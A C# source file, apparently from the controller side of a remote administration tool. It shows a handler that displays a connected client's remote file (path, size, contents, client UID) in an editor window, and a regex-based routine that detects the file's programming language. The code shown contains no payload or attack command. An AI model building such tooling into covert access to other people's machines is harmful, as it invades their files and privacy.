using PacketLib;
using Server.Forms;
using Server.Forms.UtilsForm;
using Server.Network;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handlers
{
    internal class HandleEditor
    {
        public HandleEditor(_Client _Client, MsgUnpack msgUnpack)
        {
            Editor_Form editorForm = (Editor_Form)Application.OpenForms["Editor:" + msgUnpack.GetAsString("EUID")];
            if (editorForm != null)
            {
                if (editorForm._Client == null)
                {
                    editorForm._Client = _Client;
                    editorForm.ConnectionCheckup.Start();
                }
                editorForm.Invoke(new MethodInvoker(() =>
                {
                    string uid = msgUnpack.GetAsString("UID");
                    string file = msgUnpack.GetAsString("File");
                    string fileName = Path.GetFileName(file);
                    string fileSize = msgUnpack.GetAsString("FileSize");
                    string fileContent = msgUnpack.GetAsString("FileContent");
                    FastColoredTextBoxNS.Language[] languages = (FastColoredTextBoxNS.Language[])Enum.GetValues(typeof(FastColoredTextBoxNS.Language));
                    int languageIndex = codeDetection(fileContent, Path.GetExtension(file));
                    var language = languages[languageIndex];
                    string languageName = (languageIndex == 0) ? "Plain Text" : Enum.GetName(typeof(FastColoredTextBoxNS.Language), language);
                    editorForm.editorTxtbox.Language = language;
                    editorForm.editorTxtbox.Tag = file;
                    editorForm.editorTxtbox.Text = fileContent;
                    editorForm.languageLbl.Text = "Language: " + languageName;
                    editorForm.fileNameLbl.Text = "File Name: " + fileName;
                    editorForm.fileSizeLbl.Text = "File Size: " + fileSize;
                    editorForm.uidLbl.Text = "Uid: " + uid;
                }));
            }

        }
        public int codeDetection(string code, string extension)
        {
            if ((Regex.IsMatch(code, @"using([^;]*);")  
                && Regex.IsMatch(code, @"\{([^}]*)\}")) 
                || Regex.IsMatch(code, @"namespace ([^{]*)") 
                || extension.ToLower() == ".cs")
            {
                return 1;
            }  
            if (((code.Contains("Sub") && code.Contains("End Sub"))
                || (code.Contains("If") && code.Contains("End If"))
                || (code.Contains("Class") && code.Contains("End Class"))
                || (code.Contains("Module") && code.Contains("End Module"))
                )         
                || extension.ToLower() == ".vb")
            {
                return 2;
            } 
            if ((Regex.IsMatch(code, @"<\?xml[^?>]*\?>")  
                && Regex.IsMatch(code, @"\w+=[""'][^""']*[""']") 
                && Regex.IsMatch(code, @"<[^<]*"))
                || extension.ToLower() == ".xml")
            {
                return 4;
            }
            if ((Regex.IsMatch(code, @"<\w+|\w+=[""'][^""']*[""']") 
                && Regex.IsMatch(code, @"<[^<]*"))
                || extension.ToLower() == ".html")
            {
                return 3;
            }
            if (Regex.IsMatch(code, @"<(\?php|\?)[^\?>]*\?\>")
                || extension.ToLower() == ".php")
            {
                return 6;
            }
            if (Regex.IsMatch(code, @"\{([^}]*)\}") && 
                (Regex.IsMatch(code, @"function ([^{]*)")
                || Regex.IsMatch(code, @"function\(\) ([^{]*)")
                || Regex.IsMatch(code, @"\(\(\)[^>]*>")
                || Regex.IsMatch(code, @"document\.")
                || Regex.IsMatch(code, @"window")
                || Regex.IsMatch(code, @"console\.")
                || extension.ToLower() == ".js"))
            {
                return 7;
            }
            return 0;
        }
    }
}
